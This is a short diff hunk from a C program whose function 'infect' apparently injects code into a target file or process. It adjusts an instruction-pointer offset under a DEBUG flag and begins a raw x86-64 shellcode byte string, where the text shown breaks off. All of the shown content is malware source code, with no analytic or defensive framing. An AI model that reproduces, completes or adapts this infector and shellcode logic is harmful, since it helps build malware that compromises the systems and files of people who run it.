@@ -57,7 +57,10 @@ bool	infect(const str path) {
 	
 	// To change
 	rip = rip & 0xfffffffff000;
-	rip += 0x30;
+	
+	#ifdef DEBUG
+		rip += 0x30;
+	#endif
 
 	str shellcode = "\xb8\x03\x00\x00\x00" \
 					"\xbf\x02\x00\x00\x00" \
